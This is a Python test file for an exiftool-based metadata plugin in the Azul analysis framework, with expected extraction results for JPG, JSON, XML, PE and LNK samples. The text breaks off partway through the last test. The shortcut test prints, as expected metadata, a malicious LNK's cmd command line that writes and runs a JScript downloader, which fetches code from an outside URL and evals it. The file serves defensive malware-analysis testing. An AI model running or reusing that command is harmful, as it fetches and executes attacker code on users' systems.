from azul_runner import (
    FV,
    Event,
    EventData,
    EventParent,
    JobResult,
    State,
    test_template,
)

from azul_plugin_exiftool.main import IGNORED_FIELDS_WHEN_TOO_LONG, AzulPluginExifTool


class TestExifTool(test_template.TestPlugin):
    PLUGIN_TO_TEST = AzulPluginExifTool

    def test_unknown(self):
        """
        Test the plugin OPTOUT's of unknown file types rather than erroring.
        """
        result = self.do_execution(data_in=[("content", b"\x41\x01\x03\x9f\x83")])
        self.assertJobResult(
            result,
            JobResult(
                state=State(
                    State.Label.OPT_OUT, failure_name="Unknown file type", message="No opt-out reason was provided."
                )
            ),
        )

    def test_error_occured(self):
        """
        Test metadata extraction fails for a text file.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_cart(
                        "8aa800c773544c605155591f76ba62e64cac07cccd1d9703a84b04e733472dab.cart",
                        description="text file full of 0xff bytes.",
                    ),
                )
            ],
        )

        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED_WITH_ERRORS, message="Entire file is binary 0xff's"),
                events=[
                    Event(
                        sha256="8aa800c773544c605155591f76ba62e64cac07cccd1d9703a84b04e733472dab",
                        features={"malformed": [FV("Entire file is binary 0xff's")]},
                    )
                ],
            ),
        )

    def test_mappings_feature_value_too_long(self):
        """
        Test metadata extraction fails for a json file where the comment files will be too long.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "31903ed09df4fc4058fe5233d95b5128c744a2bb1b21eda4ed64bf8efed74c78", "Benign json text file."
                    ),
                )
            ],
        )

        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="31903ed09df4fc4058fe5233d95b5128c744a2bb1b21eda4ed64bf8efed74c78",
                        features={
                            "exif_metadata": [
                                FV("3", label="Version"),
                                FV("JSON", label="FileType"),
                                FV("application/json", label="MIMEType"),
                                FV("bootstrap.bundle.js", label="File"),
                                FV("json", label="FileTypeExtension"),
                            ],
                            "mime": [FV("application/json")],
                        },
                    )
                ],
            ),
        )

    def test_comment_feature_value_too_long_completed_with_errors(self):
        """
        Test metadata extraction fails for a jpg file where the comment field will be too long.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_cart(
                        "6d972091e605c9d0a5d04bb8387b090c16c6a9d1cd70146d79532d5f43a3a4cc.cart",
                        description="Benign JPG created by Azul team with pre-pended null bytes.",
                    ),
                )
            ],
        )

        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        sha256="6d972091e605c9d0a5d04bb8387b090c16c6a9d1cd70146d79532d5f43a3a4cc",
                        features={
                            "exif_metadata": [
                                FV("1.01", label="JFIFVersion"),
                                FV("1.3", label="Megapixels"),
                                FV("1536", label="ImageWidth"),
                                FV("1536x864", label="ImageSize"),
                                FV("3", label="ColorComponents"),
                                FV("8", label="BitsPerSample"),
                                FV("864", label="ImageHeight"),
                                FV("96", label="XResolution"),
                                FV("96", label="YResolution"),
                                FV("Baseline DCT, Huffman coding", label="EncodingProcess"),
                                FV("Processing JPEG-like data after unknown 487-byte header", label="Warning"),
                                FV("YCbCr4:2:0 (2 2)", label="YCbCrSubSampling"),
                                FV("inches", label="ResolutionUnit"),
                            ]
                        },
                    )
                ],
            ),
        )

    def test_xml_with_lots_of_fields_that_cant_be_ignored(self):
        """
        Test metadata extraction fails for a jpg file where the comment field will be too long.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "2d23f036a6f82244dde8012e8e2dbce42398c4b7908679c6ca3901e767ade027",
                        "Benign XML document with too many fields to ignore.",
                    ),
                )
            ],
        )

        self.assertJobResult(
            result,
            JobResult(
                state=State(
                    State.Label.COMPLETED_WITH_ERRORS,
                    message="Completed but the following fields were truncated DataUserAgreement",
                ),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="2d23f036a6f82244dde8012e8e2dbce42398c4b7908679c6ca3901e767ade027",
                        features={
                            "exif_metadata": [
                                FV("0", label="DataDefaultControlFontId"),
                                FV(
                                    "1 つ以上の更新待ち、再起動後に続行してください。",
                                    label="DataMessageTableX800F0806",
                                ),
                                FV("12", label="DataDefaultControlFontSize"),
                                FV("3021", label="DataCCleanLangSecRefMapLangSecRefId"),
                                FV(
                                    "Dism++ はインストール元が見つかりません、もし NET3.5 有効化が必要、ISO をマウント後に続行してください。",
                                    label="DataMessageTableX800F081F",
                                ),
                                FV(
                                    "Dism++ はクラッシュしました、この問題が頻繫な発生ある場合は、mingkuang@live.com に送信ください。",
                                    label="DataMessageTableXA0020009",
                                ),
                                FV(
                                    "Dism++ は既知の互換性の問題が検出されました、続行して、KB960037をインストールしてください。",
                                    label="DataMessageTableXA002000A",
                                ),
                                FV(
                                    "Dism++ は混雑中です、多分その他のプログラムは任務遂行中です、しばらくお待ちでもう一度やり直してください。",
                                    label="DataMessageTableX000F0801",
                                ),
                                FV(
                                    "ISO への変換は Microsoft Online の ESD ファイルをサポートのみ。",
                                    label="DataMessageTableXA0020001",
                                ),
                                FV(
                                    "Microsoft アカウントのパスワードの再設定は利用できません。再設定して、公式サイトへください。",
                                    label="DataMessageTableXA0010001",
                                ),
                                FV("True", label="DataDefaultControlFontShared"),
                                FV(
                                    "Volume Shadow Copy サービスは無効です、続行して、Volume Shadow Copy サービスのスタートアップ種類を [手動] してください。",
                                    label="DataMessageTableX80042302",
                                ),
                                FV(
                                    "WIM コンテナー ラッパーに無効なイメージ インデックスが指定されました。ラッパーはイメージを開けません。",
                                    label="DataMessageTableXC143010D",
                                ),
                                FV(
                                    "WIM 内のイメージがマウント後に変更されているため、マウントされたイメージをコミットできませんでした。",
                                    label="DataMessageTableXC1420122",
                                ),
                                FV(
                                    "WIM 内のイメージがマウント後に変更されているため、指定したディレクトリを再マウントできませんでした。",
                                    label="DataMessageTableXC1420124",
                                ),
                                FV("WIMBoot と Compact は同時利用できません。", label="DataMessageTableXA0020005"),
                                FV(
                                    "WimMount サービスは状態を返さずにシャットダウンします。",
                                    label="DataMessageTableXC142011B",
                                ),
                                FV(
                                    "WimMount 抽出プロセスが初期化されるのを待っている間に Imagex がタイムアウトしました。",
                                    label="DataMessageTableXC142011A",
                                ),
                                FV(
                                    "Windows 7 SP1 にアップグレード、そして続けるください。",
                                    label="DataMessageTableXA0020004",
                                ),
                                FV(
                                    "Windows Vista SP2 にアップグレード、そして続けるください。",
                                    label="DataMessageTableXA0020003",
                                ),
                                FV("XML", label="FileType"),
                                FV("XMP format error (no closing tag for String)", label="Warning"),
                                FV("Yu Gothic UI;Meiryo UI;Meiryo", label="DataDefaultControlFontName"),
                                FV("[ ERROR ] %1", label="DataMessageTableXC144012E"),
                                FV("[ INFO ] %1", label="DataMessageTableX4144012C"),
                                FV("[ RETRY ] %1", label="DataMessageTableX81440133"),
                                FV("[ WARN ] %1", label="DataMessageTableX8144012D"),
                                FV(
                                    "[ WARN ] ファイル %1 の拡張属性は無視されました。",
                                    label="DataMessageTableXC144012F",
                                ),
                                FV("application/xml", label="MIMEType"),
                                FV(
                                    "rundll32.exe は存在しません。Dism++ は実行できません。",
                                    label="DataMessageTableXA0020008",
                                ),
                                FV(
                                    "wimserv.exe バイナリが見つかりませんでした。システム検索パスに wimserv.exe バイナリがあることを確認してください。",
                                    label="DataMessageTableXC1420119",
                                ),
                                FV(
                                    "wof ドライバーはロードしません、続行して、[オプション] - [もっと設定] - [WofAdk ドライバーの読込] を [オン] してください。",
                                    label="DataMessageTableXC1440136",
                                ),
                                FV(
                                    "wof ドライバーはロードしません、続行して、[オプション] - [もっと設定] - [WofAdk ドライバーの読込] を [オン] してください。",
                                    label="DataMessageTableXC144013B",
                                ),
                                FV("xml", label="FileTypeExtension"),
                                FV(
                                    "この OS は厳しいのスリム化です、Dism++ は続行できません。",
                                    label="DataMessageTableX80073703",
                                ),
                                FV(
                                    "この OS は厳しいのスリム化です、システムを放棄して、もう一度始動ください。",
                                    label="DataMessageTableX800F0830",
                                ),
                                FV(
                                    "このイメージの既定の関連付けは存在しません、エクスポートは利用できません。",
                                    label="DataMessageTableX20020001",
                                ),
                                FV(
                                    "このイメージ内に含まれていないファイルの抽出要求を受信しました。このファイルは抽出されません。",
                                    label="DataMessageTableXC1420104",
                                ),
                                FV(
                                    "このコンピューターには wimmount.sys ドライバーがインストールされていないため、イメージをマウントできませんでした。このエラーを解決するには、wimmount.sys ドライバーをインストールしてください。",
                                    label="DataMessageTableXC1420121",
                                ),
                                FV(
                                    "このシステムは Wow64 のサポートしません、非 64 ビット システムはオフライン ハンドルできません。",
                                    label="DataMessageTableXA0020006",
                                ),
                                FV(
                                    "このシステムは排他的操作待ちです、再起動で保留中操作を適用し、その他の操作を続行します。",
                                    label="DataMessageTableX800F082F",
                                ),
                                FV(
                                    "このマウント ディレクトリの作成に使用した WimGapi のバージョンが、現在のバージョンと一致しません。wimserv.exe 、wimmount.sys、および imagex.exe/wimgapi.dll のバージョンが一致していることを確認してください。",
                                    label="DataMessageTableXC1420132",
                                ),
                                FV(
                                    "この更新はオフライン システムに追加サポートしません。ターゲット システムを起動し、オンラインを追加します。",
                                    label="DataMessageTableX800F082E",
                                ),
                                FV(
                                    "これは対応する必要のないテスト メッセージです。メッセージ コード %1。",
                                    label="DataMessageTableX4144012B",
                                ),
                                FV(
                                    "これ更新は永続的インストールされました。アンインストールは利用できません。",
                                    label="DataMessageTableX800F0825",
                                ),
                                FV("アプリケーション", label="DataCCleanLangSecRefMapLangSecRef"),
                                FV(
                                    "サポートされていない操作です。WIMBoot を適用したイメージが、WIMBoot と互換性があることを確認してください。",
                                    label="DataMessageTableXC1440137",
                                ),
                                FV(
                                    "サポートされていない操作です。WIMBoot を適用したイメージが、ネットワーク共有ではなくローカルに保存されていることを確認してください。",
                                    label="DataMessageTableXC1440138",
                                ),
                                FV(
                                    "サポートされていない操作です。指定された WIM ファイルに含まれている既存の OS イメージが、WIMBoot でサポートされている形式であることを確認してください。",
                                    label="DataMessageTableXC1440139",
                                ),
                                FV(
                                    "サポートされていない操作です。指定されたパスにあるキャプチャする OS イメージが、WIMBoot でサポートされていることを確認してください。",
                                    label="DataMessageTableXC144013A",
                                ),
                                FV(
                                    "サーバーへの接続できません、ネットワーク接続またはファイアウォール設定を確認ください。",
                                    label="DataMessageTableX80072EE7",
                                ),
                                FV(
                                    "サーバーへの接続できません、ネットワーク接続またはファイアウォール設定を確認ください。",
                                    label="DataMessageTableX80072EFF",
                                ),
                                FV(
                                    "サービスは、フィルターから無効なメッセージを受け取りました。このメッセージは処理されません。",
                                    label="DataMessageTableXC1420109",
                                ),
                                FV(
                                    "サービスは、マウント済みのイメージに含まれないファイルの抽出を受け取りました。この抽出は無視されます。",
                                    label="DataMessageTableXC142010A",
                                ),
                                FV(
                                    "ディレクトリを完全にはマウント解除できませんでした。これは通常、アプリケーションがマウント ディレクトリ内のファイルを開いていることが原因です。マウント解除のプロセスを完了するには、これらのファイルを閉じてから、再度マウントを解除してください。",
                                    label="DataMessageTableXC1420117",
                                ),
                                FV(
                                    "ファイル ID が同じ異なる 2 つのファイルがあります。これらのファイルには、別々のフラグが設定されています。マウント操作を中止します。",
                                    label="DataMessageTableXC1420107",
                                ),
                                FV(
                                    "ファイル システム コンテナーが、1 つのファイル名を 2 回挿入しようとしました。これは無効です。WIM サービスは、1 つのファイル名につき 1 つの通知しか受け取れません。",
                                    label="DataMessageTableXC1420108",
                                ),
                                FV("ファイル(&F)", label="DataStringMapsStringLink"),
                                FV(
                                    "ボリュームのルートをマウントしようとしました。この操作はサポートされていません。",
                                    label="DataMessageTableXC1420131",
                                ),
                                FV(
                                    "マウント ディレクトリ内のファイルが使用中のため、イメージのマウントを解除できません。",
                                    label="DataMessageTableXC1420112",
                                ),
                                FV(
                                    "マウントされたイメージは既に使用されています。このイメージが別のプロセスでマウントされていないことを確認してください。",
                                    label="DataMessageTableXC1420118",
                                ),
                                FV(
                                    "マウントされていないディレクトリのマウントを解除しようとしました。",
                                    label="DataMessageTableXC142010B",
                                ),
                                FV(
                                    "マウント操作に失敗しました。マウントを実行するときは、その特定のマウント パスにあるファイルにアクセスするソフトウェア (たとえばウイルス対策ソフトウェアや検索インデックス作成ツールなど) を無効にする必要があります。",
                                    label="DataMessageTableXC1420135",
                                ),
                                FV(
                                    "マウント済みのイメージが既に格納されているディレクトリにマウントしようとしました。この操作はサポートされていません。",
                                    label="DataMessageTableXC1420113",
                                ),
                                FV(
                                    "一部クリーンアップは完了しました。ただし、完全クリーンアップが必要な場合は、Windows 8.1 にアップグレード、そして続けるください。",
                                    label="DataMessageTableXA0020002",
                                ),
                                FV(
                                    '使用許諾\r\n\r\n    Chuyu team strongly recommends every user to read the following user agreement (hereinafter referred to as "agreement", or "this agreement") carefully before using Dism++. Anyone chooses not to comply with or fail to understand the intended meaning of the agreement should not be allowed, nor be granted the right granted by Chuyu team to use Dism++. Anyone who uses Dism++ is considered to agree with the following agreement, and to comply with the content of this agreement.\r\n\r\n    This agreement defines the rights and obligations between Dism++ users of "Dism++" software service (hereinafter referred to as "service", or "this service") and Chuyu team. "Users", and "Dism++ users" refer to individuals who register, login, or utilize this service. This agreement is subject to updates from Chuyu team at any possible moment. Updated agreement, once published in any format, replaces the original agreement. Dism++ should display the updated agreement when the software properly initiates. Dism++ users must stop using this software and the services fom Chuyu team immediately if they choose not to comply with the updated agreement.\r\n\r\n一、権利と義務\r\n\r\n    1. Dism++ は PC で個人的な利用のみ。どれか非個人的な利用（商用利用、職業利用含むがこれらに限定されません）は許可しない。\r\n    2. Dism++ users must read this agreement and other content in the document of Dism++ carefully before using Dism++.\r\n    3. Dism++ users have the obligation to report bugs and possible improvements to Chuyu team. Anyone who uses Dism++ for over 30 days should send mingkuang a "Dism++ usage report" that is no less than 345 words. Anyone who uses Dism++ for 8 mounths or longer should send mingkuang an annual report (at least 520 words) on the topic "the suggestion and possible improvement on Dism++" on November 11th (local time). Email of mingkuang: mingkuang@live.com.\r\n    4. Dism++ users should retain the love for peace, for group work, and of helping others.\r\n    5. Dism++ users should comply with the Basic Law (or local equivalents). Any action that violates copyright of Chuyu team or this agreement (including but not limited to inappropriately copy, propagate, display, mirror, upload, download, modify), and those that negatively impact Chuyu team\'s operation or services will be subject to serious legal actions.\r\n    6. Anyone who fails to comply with this agreement automatically loses any right granted by Chuyu team. Chuyu team retain right to stop all software of Chuyu team in their PC(s), to reject any of their proposal(s), and to persue legal actions gainst them.\r\n    7. Chuyu team will try their best to provide technical support for those who comply with this agreement, when all of the following factors permit: the complexity of issue, the availability of Chuyu team, and the other users\' vote.\r\n\r\n二、プライバシーに関する\r\n\r\n    1. After initialisation, Dism++ will collect Dism++ users\' system information (including but not restricted to the system version, system structure, system language, CPU information, RAM information), and Dism++\'s own report (including but not restricted to the system crash dump and log files) to improve the service. Dism++ will not collect user identification information nor user\'s contact information.\r\n    2. Chuyu team may send users invitations for testing Dism++, invitations for voting to help Chuyu team\'s decisioning, and software updates, but Chuyu team will never send messages that include but not limited to advertisements, promotions, frauds, or request for payment.\r\n\r\n三、リスクを負う\r\n\r\n    1. Chuyu team has an open-type attitude so everyone can let Dism++ better. Some functions may lead unknown aftermath so Chuyu team will remove the possible risk and tell the users. But we didn\'t solve all the issue. You must bear all the aftermath yourself. Please tell Chuyu team after you find some problems to prevent others have the problems.\r\n    2. Please understand and agree because our softwares need to develop. Chuyu team persists the rights to change or pause or end or revoke all or some servic',
                                    label="DataUserAgreement",
                                ),
                                FV(
                                    "再マウント対象として無効であるため、指定したディレクトリを再マウントできませんでした。代表的な無効理由は、ディレクトリが既にマウント解除されていることです。",
                                    label="DataMessageTableXC1420123",
                                ),
                                FV(
                                    "分割された WIM をマウントしようとしました。この操作はサポートされていません。",
                                    label="DataMessageTableXC1420130",
                                ),
                                FV(
                                    "存在しないディレクトリにマウントしようとしました。この操作はサポートされていません。",
                                    label="DataMessageTableXC1420115",
                                ),
                                FV(
                                    "存在しないファイルの抽出要求を受信しました。他のファイル システム フィルターによる不適切な操作が原因の可能性があります。マウント ディレクトリでウイルス対策ソフトウェアまたはバックアップ ソフトウェアが実行中でないことを確認してください。",
                                    label="DataMessageTableXC1420105",
                                ),
                                FV(
                                    "必要なファイル CBSHost.dll は存在しません。Dism++ の整合性を確認ください。",
                                    label="DataMessageTableXA0020007",
                                ),
                                FV(
                                    "抽出プロセスに、存在しないマウント ディレクトリが指定されました。抽出プロセスの開始前にイメージがスタブ化されている必要があります。",
                                    label="DataMessageTableXC142010E",
                                ),
                                FV(
                                    "抽出済みのファイルの抽出要求を受信しました。この要求は受け付けられません。",
                                    label="DataMessageTableXC1420106",
                                ),
                                FV(
                                    "指定されたマウント済みイメージを WIM にコミットして戻すことができません。これはイメージの一部のみがマウント解除されていたり、イメージがマウント中であることが原因です。以前にこのイメージをコミットしてマウント解除したことがある場合は、コミットは正常に終了した可能性があります。コミットが正常に終了しているかどうかを確認してから、コミットなしでマウント解除してください。",
                                    label="DataMessageTableXC142011D",
                                ),
                                FV(
                                    "指定した WIM の指定したイメージは、既に読み取り/書き込みアクセス用にマウントされています。",
                                    label="DataMessageTableXC1420127",
                                ),
                                FV(
                                    "指定したイメージ ハンドルが正しいアクセス レベルで開かれませんでした。イメージ ハンドルをマウントするには、ハンドルに WIM_GENERIC_MOUNT アクセスがある必要があります。",
                                    label="DataMessageTableXC1420128",
                                ),
                                FV(
                                    "指定したイメージ ハンドルは、イメージのマウントに使用されていないため、マウント解除に使用できません。イメージのマウントを解除するには、マウント ディレクトリ名を指定して WIMUnmountImage を呼び出してください。",
                                    label="DataMessageTableXC1420110",
                                ),
                                FV(
                                    "指定したイメージのマウント ディレクトリが変更されました。このイメージ内のすべてのファイルは抽出され、このイメージをコミットすることはできません。",
                                    label="DataMessageTableXC142011E",
                                ),
                                FV(
                                    "指定したイメージは既にマウントされているため、再度マウントすることはできません。",
                                    label="DataMessageTableXC1420126",
                                ),
                                FV(
                                    "指定したディレクトリには、破損したマウント イメージが含まれています。このディレクトリでは、マウント操作を行うことはできません。",
                                    label="DataMessageTableXC1420120",
                                ),
                                FV(
                                    "指定したディレクトリは再マウント処理中であるため、再マウントできませんでした。",
                                    label="DataMessageTableXC1420125",
                                ),
                                FV(
                                    "指定したディレクトリは有効なマウント済みのディレクトリではありません。",
                                    label="DataMessageTableXC142011C",
                                ),
                                FV(
                                    "指定したマウント データに一致するイメージが見つかりませんでした。",
                                    label="DataMessageTableXC1420111",
                                ),
                                FV(
                                    "指定したマウント パスのドライブはサポートされていません。固定ドライブ上のボリュームにマウントしてください。",
                                    label="DataMessageTableXC1420134",
                                ),
                                FV(
                                    "指定したマウント パスのボリュームが再解析ポイントをサポートしていません。再解析ポイントをサポートするボリュームにマウントしてください。",
                                    label="DataMessageTableXC142011F",
                                ),
                                FV(
                                    "指定したライブラリは、有効なファイル システム コンテナーではありません。",
                                    label="DataMessageTableXC1420100",
                                ),
                                FV(
                                    "指定したログ ファイルは存在しますが、Unicode でエンコードされたテキスト ファイルではありません。Unicode でエンコードされたテキスト ファイルのみサポートされます。",
                                    label="DataMessageTableXC1440129",
                                ),
                                FV("文件(&F)", label="DataStringMapsStringTarget"),
                                FV(
                                    "既存のディレクトリにイメージをマウントしようとしました。この操作はサポートされていません。",
                                    label="DataMessageTableXC1420103",
                                ),
                                FV(
                                    "無効なイメージ ハンドルが WIMUnmountImageHandle に渡されました。WIMUnmountImageHandle で使用できるのは、WIMMountImageHandle に渡したイメージ ハンドルまたは WIMGetMountedImageHandle から取得したイメージ ハンドルのみです。",
                                    label="DataMessageTableXC1420116",
                                ),
                                FV(
                                    "無効なハンドルがイメージ マネージャーに渡されました。これは、プログラム エラーです。",
                                    label="DataMessageTableXC142010F",
                                ),
                                FV(
                                    "空でないディレクトリにマウント使用としました。この操作はサポートされていません。",
                                    label="DataMessageTableXC1420114",
                                ),
                                FV("認識できないメッセージを受信しました ID: %1。", label="DataMessageTableX8144012A"),
                                FV(
                                    "読み取り専用のアクセス用にマウントされたイメージをコミットしようとしました。これは無効です。イメージをコミットするには、読み取り専用のフラグを設定しないでマウントしてください。",
                                    label="DataMessageTableXC142010C",
                                ),
                                FV(
                                    "読み取り専用のコンテナー ライブラリを使用して、読み取り/書き込みアクセス用イメージをマウントしようとしました。",
                                    label="DataMessageTableXC1420101",
                                ),
                            ],
                            "mime": [FV("application/xml")],
                        },
                    )
                ],
            ),
        )

    def test_shortcut(self):
        """
        Test metadata extraction from lnk shortcut file.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "7ccb8a50afa675bcba87788d7364db5a037ba507cafbe3ec5c802563f4cb505a",
                        "Malicious Windows shortcut, with a link to a bad URL.",
                    ),
                )
            ]
        )
        try:
            # Filter out value that only appears in docker.
            # The feature value FV("685C-785D", label="DriveSerialNumber"),
            # appears in Debian Docker tests but not devVm.
            for i, f in enumerate(result.events[0].features["exif_metadata"]):
                if f.label == "DriveSerialNumber" and f.value == "685C-785D":
                    result.events[0].features["exif_metadata"].pop(i)
                    break
        except Exception:
            pass
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="7ccb8a50afa675bcba87788d7364db5a037ba507cafbe3ec5c802563f4cb505a",
                        features={
                            "exif_metadata": [
                                FV("%temp%", label="WorkingDirectory"),
                                FV("..\\..\\..\\WINDOWS\\system32\\cmd.exe", label="RelativePath"),
                                FV(
                                    '/c echo. 2>k.js&echo var l = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");l.open("GET","http://load-the-attach.com/scr/scr",false);l.send^(^);var p = l.responseText;eval^(p^);>k.js&k.js',
                                    label="CommandLineArguments",
                                ),
                                FV("0", label="FontWeight"),
                                FV("0 x 0", label="FontSize"),
                                FV("0 x 0", label="WindowOrigin"),
                                FV("0x07", label="FillAttributes"),
                                FV("0xf5", label="PopupFillAttributes"),
                                FV("1", label="IconIndex"),
                                FV("2008:04:15 12:00:00+00:00", label="CreateDate"),
                                FV("2008:04:15 12:00:00+00:00", label="ModifyDate"),
                                FV("2016:06:22 01:15:16+00:00", label="AccessDate"),
                                FV("25", label="CursorSize"),
                                FV("396288", label="TargetFileSize"),
                                FV("4", label="NumHistoryBuffers"),
                                FV("50", label="HistoryBufferSize"),
                                FV("80 x 25", label="WindowSize"),
                                FV("80 x 300", label="ScreenBufferSize"),
                                FV("Archive", label="FileAttributes"),
                                FV("C:\\WINDOWS\\system32\\SHELL32.dll", label="IconFileName"),
                                FV("C:\\WINDOWS\\system32\\cmd.exe", label="LocalBasePath"),
                                FV("Don't Care", label="FontFamily"),
                                FV("Fixed Disk", label="DriveType"),
                                FV(
                                    "IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode, ExpString, ExpIcon",
                                    label="Flags",
                                ),
                                FV("LNK", label="FileType"),
                                FV("No", label="FullScreen"),
                                FV("No", label="QuickEdit"),
                                FV("No", label="RemoveHistoryDuplicates"),
                                FV("Show Minimized No Activate", label="RunWindow"),
                                FV("Yes", label="InsertMode"),
                                FV("Yes", label="WindowOriginAuto"),
                                FV("application/octet-stream", label="MIMEType"),
                                FV("cmd.exe", label="TargetFileDOSName"),
                                FV("hzx", label="MachineID"),
                                FV("lnk", label="FileTypeExtension"),
                            ],
                            "mime": [FV("application/octet-stream")],
                        },
                    )
                ],
            ),
        )

    def test_exe(self):
        """
        Test metadata extraction from Windows PE file.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "702e31ed1537c279459a255460f12f0f2863f973e121cd9194957f4f3e7b0994",
                        "Benign WIN32 EXE, python library executable python_mcp.exe",
                    ),
                )
            ]
        )

        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        sha256="702e31ed1537c279459a255460f12f0f2863f973e121cd9194957f4f3e7b0994",
                        features={
                            "exif_metadata": [
                                FV("0", label="UninitializedDataSize"),
                                FV("0.0", label="ImageVersion"),
                                FV("0x12a8", label="EntryPoint"),
                                FV("1", label="PDBAge"),
                                FV("2012:04:10 21:31:52+00:00", label="PDBModifyDate"),
                                FV("2012:04:10 21:31:52+00:00", label="TimeStamp"),
                                FV("23040", label="InitializedDataSize"),
                                FV("2560", label="CodeSize"),
                                FV("5.0", label="OSVersion"),
                                FV("5.0", label="SubsystemVersion"),
                                FV("9.0", label="LinkerVersion"),
                                FV(
                                    "C:\\Users\\martin\\27\\python\\PCbuild\\Win32-pgo\\python.pdb",
                                    label="PDBFileName",
                                ),
                                FV("Intel 386 or later, and compatibles", label="MachineType"),
                                FV("No relocs, Executable, 32-bit", label="ImageFileCharacteristics"),
                                FV("PE32", label="PEType"),
                                FV("Win32 EXE", label="FileType"),
                                FV("Windows command line", label="Subsystem"),
                                FV("application/octet-stream", label="MIMEType"),
                                FV("exe", label="FileTypeExtension"),
                            ],
                            "mime": [FV("application/octet-stream")],
                            "pe_characteristics": [FV("32-bit"), FV("Executable"), FV("No relocs")],
                            "pe_code_size": [FV("2560")],
                            "pe_image_version": [FV("0.0")],
                            "pe_init_data_size": [FV("23040")],
                            "pe_linker_version": [FV("9.0")],
                            "pe_machine": [FV("Intel 386 or later, and compatibles")],
                            "pe_os_version": [FV("5.0")],
                            "pe_subsystem": [FV("Windows command line")],
                            "pe_subsystem_version": [FV("5.0")],
                            "pe_uninit_data_size": [FV("0")],
                        },
                    )
                ],
            ),
        )

    def test_exe_versioninfo(self):
        """
        Test metadata extraction from Windows PE file with VERSIONINFO resource.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "60c06e0fa4449314da3a0a87c1a9d9577df99226f943637e06f61188e5862efa",
                        "Benign Windows 32DLL distributed by Microsoft named msvcr100.dll.",
                    ),
                )
            ]
        )

        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        sha256="60c06e0fa4449314da3a0a87c1a9d9577df99226f943637e06f61188e5862efa",
                        features={
                            "exif_metadata": [
                                FV("0", label="FileSubtype"),
                                FV("0", label="UninitializedDataSize"),
                                FV("0x003f", label="FileFlagsMask"),
                                FV("0x11dfc", label="EntryPoint"),
                                FV("10.0", label="ImageVersion"),
                                FV("10.0", label="LinkerVersion"),
                                FV("10.0.40219.1", label="FileVersionNumber"),
                                FV("10.0.40219.1", label="ProductVersionNumber"),
                                FV("10.00.40219.1", label="FileVersion"),
                                FV("10.00.40219.1", label="ProductVersion"),
                                FV("2", label="PDBAge"),
                                FV("2011:02:19 00:17:38+00:00", label="PDBModifyDate"),
                                FV("2011:02:19 00:17:38+00:00", label="TimeStamp"),
                                FV("44544", label="InitializedDataSize"),
                                FV("5.1", label="OSVersion"),
                                FV("5.1", label="SubsystemVersion"),
                                FV("726016", label="CodeSize"),
                                FV("Dynamic link library", label="ObjectFileType"),
                                FV("English (U.S.)", label="LanguageCode"),
                                FV("Executable, Large address aware, 32-bit, DLL", label="ImageFileCharacteristics"),
                                FV("Intel 386 or later, and compatibles", label="MachineType"),
                                FV("Microsoft Corporation", label="CompanyName"),
                                FV("Microsoft® C Runtime Library", label="FileDescription"),
                                FV("Microsoft® Visual Studio® 2010", label="ProductName"),
                                FV("PE32", label="PEType"),
                                FV("Unicode", label="CharacterSet"),
                                FV("Win32 DLL", label="FileType"),
                                FV("Windows GUI", label="Subsystem"),
                                FV("Windows NT 32-bit", label="FileOS"),
                                FV("application/octet-stream", label="MIMEType"),
                                FV("dll", label="FileTypeExtension"),
                                FV("msvcr100.i386.pdb", label="PDBFileName"),
                                FV("msvcr100_clr0400.dll", label="InternalName"),
                                FV("msvcr100_clr0400.dll", label="OriginalFileName"),
                                FV("© Microsoft Corporation.  All rights reserved.", label="LegalCopyright"),
                            ],
                            "mime": [FV("application/octet-stream")],
                            "pe_characteristics": [
                                FV("32-bit"),
                                FV("DLL"),
                                FV("Executable"),
                                FV("Large address aware"),
                            ],
                            "pe_code_size": [FV("726016")],
                            "pe_copyright": [FV("© Microsoft Corporation.  All rights reserved.")],
                            "pe_description": [FV("Microsoft® C Runtime Library")],
                            "pe_file_version": [FV("10.0.40219.1")],
                            "pe_image_version": [FV("10.0")],
                            "pe_init_data_size": [FV("44544")],
                            "pe_internal_name": [FV("msvcr100_clr0400.dll")],
                            "pe_linker_version": [FV("10.0")],
                            "pe_machine": [FV("Intel 386 or later, and compatibles")],
                            "pe_original_name": [FV("msvcr100_clr0400.dll")],
                            "pe_os_version": [FV("5.1")],
                            "pe_product_name": [FV("Microsoft® Visual Studio® 2010")],
                            "pe_product_version": [FV("10.0.40219.1")],
                            "pe_publisher": [FV("Microsoft Corporation")],
                            "pe_subsystem": [FV("Windows GUI")],
                            "pe_subsystem_version": [FV("5.1")],
                            "pe_uninit_data_size": [FV("0")],
                        },
                    )
                ],
            ),
        )

    def test_json(self):
        """
        This sample triggered horrible behaviour of this plugin.
        """
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "37e29c9e186542cd7b01636346db675a5592595799f8955f08be419442e9418f", "Benign Json data file."
                    ),
                )
            ]
        )

        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        sha256="37e29c9e186542cd7b01636346db675a5592595799f8955f08be419442e9418f",
                        features={
                            "exif_metadata": [
                                FV("-2", label="FormatsPreference"),
                                FV("0", label="Age_limit"),
                                FV("1080", label="Height"),
                                FV("1080", label="Width"),
                                FV("1080p+medium", label="Format_note"),
                                FV("1080x1080", label="Resolution"),
                                FV("129.498", label="Abr"),
